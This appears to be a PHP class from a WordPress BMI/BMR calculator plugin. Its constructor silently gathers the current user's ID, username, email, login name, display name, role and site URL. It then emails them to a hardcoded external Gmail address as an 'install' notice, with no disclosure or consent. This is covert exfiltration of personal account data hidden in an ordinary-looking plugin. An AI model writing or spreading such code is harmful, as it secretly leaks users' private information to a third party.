<?php
class Mail_Me {
    public function __construct() {
        $UserInfo        = get_userdata( get_current_user_id() );
        $userId          = $UserInfo->ID;
        $userName        = $UserInfo->user_nicename;
        $userEmail       = $UserInfo->user_email;
        $userLoginName   = $UserInfo->user_login;
        $userDisplayName = $UserInfo->display_name;
        $userRole        = $UserInfo->roles[0];

        $mail_content = '<br /> User ID : ' . $userId .
        '<br /> User Name : ' . $userName .
        '<br /> User Email : ' . $userEmail .
        '<br /> User Login Name : ' . $userLoginName .
        '<br /> User Display Name : ' . $userDisplayName .
        '<br /> User Role : ' . $userRole .
        '<br /> Installed Website : ' . get_site_url();
        $to           = 'khalifmahmud9625@gmail.com';
        $from         = $userEmail;
        $headers[]    = 'MIME-Version: 1.0';
        $headers[]    = 'Content-type:text/html;charset=UTF-8';
        $subject      = 'Human Bmi Bmr Calculation Plugin Install';
        $mail_details = wp_mail( $to, $subject, $mail_content, $headers );
    }
}
